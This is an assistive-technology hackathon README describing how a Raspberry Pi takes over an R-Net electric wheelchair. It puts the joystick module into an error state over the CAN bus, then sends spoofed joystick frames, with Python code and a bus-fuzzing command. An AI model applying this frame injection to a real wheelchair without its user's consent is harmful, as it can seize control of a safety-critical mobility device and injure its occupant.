MHK: control wheelchair hack based on the can2RNET project 
================================================
- This hack exploit is part of "the Magic Joystick" project led by a french solidarity association: MyHumanKit - https://myhumankit.org/ 
- It occured during the Fabrikarium hackaton held in Mureaux, october 2019, with collaboration of MyHumanKit & ArianeGroup.
- Big credits to the 'can2RNET' github owners (Stephen Chavez & Specter) and their contributors to have documented and shared their exploit.


The complete documentation is available in french here : 
http://wikilab.myhumankit.org/index.php?title=Projets:Can2RNET

[![IMAGE ALT TEXT](http://img.youtube.com/vi/GE2F3cAntdk/0.jpg)](http://www.youtube.com/watch?v=GE2F3cAntdk "Prise de controle à distance d'un fauteuil roulant électrique")

Getting Started
=====================
Hardware:
- Raspberry Pi 3 (Model B+)
- PiCan2 board (not used)  
- R-Net cable 
- Xbox360 gamepad 

Configure:
1. /boot/config.txt
```
dtparam=spi=on 
dtoverlay=mcp2515-can0,oscillator=16000000,interrupt=25         
dtoverlay=spi-bcm2835
```
2. /etc/network/interfaces
```
allow-hotplug can0
iface can0 can static
        bitrate 125000
        up /sbin/ip link set $IFACE down
        up /sbin/ip link set $IFACE up
```
3. load /etc/modules
```
mcp251x
can_dev
```
4. Reboot Raspberry, check 'can0' interface is set ( use `ifconfig`)

5. Strip R-Net cable in half and connect chair to pican2:
```
white is can high
blue is can low
black is gnd
red is +vin
```

6. Install CAN-UTILS
```
sudo apt-get install can-utils
```
```
$ candump can0 -L   # -L puts in log format
(1469933235.191687) can0 00C#
(1469933235.212450) can0 00E#08901C8A00000000
(1469933235.212822) can0 7B3#
(1469933235.251708) can0 7B3#

$ cansend can0 181C0D00#0840085008440840  #play a tune

$ cangen can0 -e -g 10  -v -v     #fuzz buss with random extended frames+data

$ candump -n 1 can0,7b3:7ff     #wait for can id 7B3
```

Monitor & Send RNET frames  
================================
Check original 'can2RNET' documentation first :
- doc/canPPT.pdf
- doc/RNETdictionary_*.txt 

Spy CAN frames while :
- powering on JSM's joystick 
- moving JSM's joystick
- activating light, horn, ...

Identify period JSM heartbeat frame:
- "03c30F0F#8787878787878787" @10Hz

Identify joystick control frame:  
- "02000000#XxYy" @100Hz (device JSM n°0) 
- "02001000#XxYy" @100Hz (device JSM n°1) 

Induce JSM in error and send joystick frame on behalf of JSM
- Send at least 3 times in less than 1 ms this frame: "0c000000#"
- Send joystick frame with the same id "02000000#XxYy" 
```python
import can2RNET
from common import FRAME_JSM_INDUCE_ERROR, createJoyFrame

# send in less than 1ms theses frames to induce JSM in error
for _ in range(5):
   can2RNET.cansend(cansocket, FRAME_JSM_INDUCE_ERROR)

# now let's take over by sending our own
# joystick frame @100Hz

mintime = .01
nexttime = time() + mintime
while True:
   # get new XY joystick increment
   joystick_x, joystick_y = get_new_joystick_position()
   # building joy frame
   joyframe = createJoyFrame(joystick_x, joystick_y)
   # sending frame
   can2RNET.cansend(cansocket, joyframe)
   # .. at 100 Hz ..
   nexttime += mintime
   t = time()
   if t < nexttime:
      sleep(nexttime - t)
   else:
      nexttime += mintime
```

JSMFollow - (not reproduced) 

JSMEmulate - (not reproduced)


Control wheelchair using any usb gamepad 
=========================================
Launch this script on the raspberrypi  
`python3 runJSMExploit.py`
